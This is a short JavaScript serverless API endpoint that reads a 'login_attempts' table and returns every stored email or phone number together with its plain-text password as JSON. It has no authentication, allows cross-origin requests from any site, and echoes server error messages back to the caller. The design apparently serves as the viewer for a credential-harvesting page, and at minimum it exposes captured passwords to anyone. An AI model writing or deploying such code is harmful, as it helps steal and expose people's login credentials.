// api/login-attempts.js
import { neon } from "@neondatabase/serverless";

export default async function handler(req, res) {
  // Enable CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  try {
    // Connect to database using Neon
    const sql = neon(process.env.DATABASE_URL);

    const result = await sql`
      SELECT id, email_or_phone, password, created_at 
      FROM login_attempts 
      ORDER BY created_at DESC
    `;

    return res.status(200).json({
      success: true,
      attempts: result,
      total: result.length,
    });
  } catch (error) {
    console.error("Error:", error);
    return res.status(500).json({
      success: false,
      message: "Server error: " + error.message,
    });
  }
}
